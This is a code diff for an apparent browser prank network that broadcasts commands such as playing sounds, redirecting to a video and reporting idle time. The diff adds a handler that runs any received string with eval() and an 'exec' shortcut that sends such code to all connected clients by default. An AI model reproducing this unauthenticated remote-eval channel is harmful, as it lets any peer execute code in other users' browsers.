@@ -16,12 +16,29 @@ function distribute_commands(command)
     {
         window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     }
+    if (command.eval)
+    {
+        try
+        {
+            let out = eval(command.eval);
+            // send response to command invoker
+            format_and_send_response({"info":out}, invoker);
+        }
+        catch (e)
+        {
+            format_and_send_response({"error":+e.toString()}, invoker);
+        }
+    }
+    if (command.log)
+    {
+        console.log(command.log)
+    }
 }
 
 
 function sound_command_handler(link, invoker)
 {
-    let audio;
+    let audio=false;
     if (link === "darude")
         audio = darude;
     else if (link === "relax")
@@ -39,22 +56,47 @@ function sound_command_handler(link, invoker)
                 setTimeout(()=>{alert("song pls?")}, 5000);
             }
 
-            QUEUE.push(format_response({"play_song": `song played on ${IP}`}, invoker))
+            format_and_send_response({"info": `song played on ${IP}`}, invoker)
         }
         catch (e)
         {
-            QUEUE.push(format_response({"play_song":`song failed on ${IP} because of ${e.toString()}`}, invoker))
+            format_and_send_response({"info":`song failed on ${IP} because of ${e.toString()}`}, invoker)
         }
     }
     else
     {
-        QUEUE.push(format_response({"play_song": `song not found ${link}`}, invoker))
+        format_and_send_response({"info": `song not found ${link}`}, invoker)
     }
 }
 
 function get_my_last_interaction(invoker)
 {
-    QUEUE.push(format_response({"last_interaction": client_interaction}, invoker))
+    if (client_interaction)
+    {
+        let seconds = Math.round(((new Date).getTime()-client_interaction)/1000);
+        console.log("seconds", seconds);
+        let minutes;
+        let hours;
+        if (seconds >= 60)
+        {
+            minutes = Math.round(seconds/60);
+            seconds = Math.round(seconds%60);
+        }
+        if (minutes >= 60)
+        {
+            hours = Math.round(minutes/60);
+            minutes = Math.round(minutes%60);
+        }
+        let msg = `${hours===undefined?"0":hours}h : ${minutes===undefined?"0":minutes}m : ${seconds}s`;
+        format_and_send_response({"info": `client ${IP} interacted ${msg} ago!` }, invoker)
+    }
+    else
+    {
+        format_and_send_response({"info": `client ${IP} haven't interacted yet` }, invoker)
+    }
+
+
+
 }
 
 
@@ -62,21 +104,65 @@ function command_response_handler(action)
 {
     let client = action.client;
     let response = action.command.command_response;
-    if (response.last_interaction)
+
+    if (response.info)
     {
-        console.log("user", client, "interacted", ((new Date()).getTime() - response.last_interaction)/1000, "seconds ago",  )
+        console.log(">>> " + response.info)
     }
-    if (response.play_song)
+    if (response.error)
     {
-        console.log(response.play_song)
+        console.log(">!> " + response.error)
     }
+
 }
 
 // response
 // {"command":{"command_response":{"sonething": resp, "invoker": invoker}}, "client":IP}
-function format_response(resp_info, invoker)
+
+function format_and_send_command(command_object, receiverIP)
 {
-    resp_info.invoker = invoker;
-    console.log({"command":{"command_response":resp_info}, "client":IP});
-    return {"command":{"command_response":resp_info}, "client":IP}
+    if (receiverIP)
+        command_object.receiver = receiverIP;
+    else
+      command_object.receiver = "all";
+
+    command_object.invoker = IP;
+    let r = {"command":{"command": command_object}, "client": IP,};
+    QUEUE.push(r);
+    return r;
 }
+
+function format_and_send_response(resp_info, invoker)
+{
+    // dont send response to self
+    if (invoker === IP)
+        return;
+
+    resp_info.invoker = invoker;
+    let r = {"command":{"command_response":resp_info}, "client":IP};
+    console.log(r);
+    QUEUE.push(r);
+    return r
+}
+
+// some command shortcuts
+function exec(key, arg, rec)
+{
+    switch (key)
+    {
+        case "darude":
+            format_and_send_command({"snd":"darude"}, rec===undefined?"all":rec);
+            break;
+        case "relax":
+            format_and_send_command({"snd":"relax"}, rec===undefined?"all":rec);
+            break;
+        case "eval":
+            format_and_send_command({"eval":arg}, rec===undefined?"all":rec);
+            break;
+        case "inter":
+            format_and_send_command({"send_last_interaction":"1"}, rec===undefined?"all":rec);
+    }
+
+}
+
+
